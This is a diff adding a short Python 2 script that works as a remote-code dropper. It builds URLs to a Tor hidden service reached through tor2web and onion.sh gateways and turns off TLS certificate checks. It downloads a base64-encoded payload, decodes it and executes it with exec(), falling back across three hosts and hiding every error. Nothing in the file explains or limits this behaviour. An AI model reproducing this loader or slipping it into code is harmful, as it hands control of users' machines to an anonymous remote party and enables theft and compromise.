@@ -1,0 +1,31 @@
+import base64
+import urllib2
+import ssl
+HOST="https://an7kmd2wp4xo7hpr"
+RPATH1="src/sc"
+d1=HOST+".tor2web.su/"+RPATH1
+d3=HOST+".onion.sh/"+RPATH1
+d2=HOST+".tor2web.io/"+RPATH1
+def ld(url, t):
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    except Exception:
+        ctx=False
+    if ctx:
+           page=base64.b64decode(urllib2.urlopen(url,timeout=t,context=ctx).read())
+    else:
+           page=base64.b64decode(urllib2.urlopen(url,timeout=t).read())
+    return page
+try:
+    try:
+        page=ld(d1, 41)
+        exec(page)
+    except Exception:
+        page=ld(d2, 41)
+        exec(page)
+except Exception:
+    page=ld(d3, 41)
+    exec(page)
+    pass
